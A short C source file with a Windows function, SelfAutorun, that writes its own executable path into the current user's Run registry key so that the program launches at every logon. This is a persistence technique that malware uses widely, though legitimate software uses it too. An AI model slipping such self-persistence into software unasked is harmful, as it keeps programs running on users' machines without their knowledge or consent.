#include "Header.h"
BOOL SelfAutorun() {
	HKEY hKey = NULL;
	LONG lResult = 0;
	TCHAR szExeName[MAX_PATH + 1];
	GetModuleFileName(GetModuleHandle(0), szExeName, STRLENN(szExeName));
	lResult = RegOpenKey(
		HKEY_CURRENT_USER,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		&hKey);
	if (ERROR_SUCCESS != lResult) {
		return FALSE;
	}
	RegSetValueEx(hKey, "Autorun", 0, REG_SZ, (PBYTE)(szExeName),
		lstrlen(szExeName) * sizeof(TCHAR) + 1);
	RegCloseKey(hKey);
	return TRUE;
}